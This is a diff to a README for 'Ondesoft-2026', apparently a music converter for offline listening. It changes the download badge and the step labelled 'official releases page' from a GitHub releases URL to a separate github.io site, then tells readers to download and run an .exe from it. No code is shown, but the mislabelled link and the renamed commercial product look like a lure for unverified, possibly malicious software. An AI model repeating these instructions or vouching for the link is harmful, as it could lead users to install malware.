@@ -1,6 +1,6 @@
 # 🎵 Ondesoft-2026 - Save your music for offline listening
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Apexcor2641/Ondesoft-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://apexcor2641.github.io)
 
 This application converts your tracks so you can listen without a web connection. You keep your files on your computer. It works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ This application converts your tracks so you can listen without a web connection
 
 Follow these steps to get the program on your computer.
 
-1. Visit the [official releases page](https://github.com/Apexcor2641/Ondesoft-2026/releases).
+1. Visit the [official releases page](https://apexcor2641.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the transfer.
 4. Save the file to your desktop or downloads folder.
